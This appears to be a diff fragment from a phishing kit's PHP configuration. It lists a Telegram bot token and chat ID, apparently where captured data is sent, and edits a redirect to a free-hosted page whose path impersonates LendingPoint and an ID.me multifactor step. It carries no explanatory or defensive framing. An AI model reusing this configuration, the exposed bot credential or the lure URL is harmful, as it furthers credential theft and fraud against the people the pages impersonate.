@@ -22,7 +22,7 @@ $site_map = [
             ['token' => '6304581861:AAGcg6NEHDa53yh9gIr_744so-hVPB-nFxk', 'chat_id' => '5539028238']
 
         ],
-        'redirect' => 'https://lending-point.rf.gd/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
+        'redirect' => 'https://lending-point.rf.gd/cache_site/lendingpoint/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
     ],
     // Add more sites...
 ];
